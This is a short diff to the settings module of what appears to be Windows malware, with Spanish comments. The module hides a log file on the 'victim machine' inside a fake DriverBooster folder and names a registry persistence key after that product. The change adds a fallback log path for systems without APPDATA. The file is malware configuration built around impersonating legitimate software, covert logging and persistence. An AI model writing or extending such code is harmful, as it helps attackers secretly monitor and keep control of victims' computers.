@@ -6,7 +6,10 @@ Modificar estos valores para ajustar el comportamiento sin tocar la lógica.
 import os
 
 # Ruta del log local en la máquina víctima
-LOG_FILE = os.path.join(os.environ["APPDATA"], "DriverBooster", "logs", "cache.dat")
+try:
+    LOG_FILE = os.path.join(os.environ["APPDATA"], "DriverBooster", "logs", "cache.dat")
+except KeyError:
+    LOG_FILE = os.path.join(os.path.expanduser("~"), ".driverbooster", "cache.dat")
 
 # Nombre del proceso en el registro de Windows (clave de persistencia)
 APP_NAME = "DriverBooster Scheduler 10.4"
